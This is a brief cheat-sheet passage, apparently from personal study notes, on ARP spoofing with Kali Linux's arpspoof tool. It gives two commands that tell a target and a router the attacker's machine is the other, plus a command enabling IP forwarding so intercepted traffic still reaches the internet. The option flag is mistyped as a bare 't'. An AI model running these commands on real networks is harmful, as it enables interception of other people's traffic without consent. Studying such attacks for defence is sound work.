Similar Built-In Tools In Kali:
-----------------------------------

arpspoof


arpspoof -i eth0 t Target-IP Router-IP    ===> tells the Target that I'm the Router

arpspoof -i eth0 t Router-IP Target-IP    ===> tells the Router that I'm the target

echo 1 > /proc/sys/net/ipv4/ip_forward    ===> enable port forwarding to make the target have normal internet access


The Target's Requests comes to the Attacker's Machine First then it forwards to the Router!
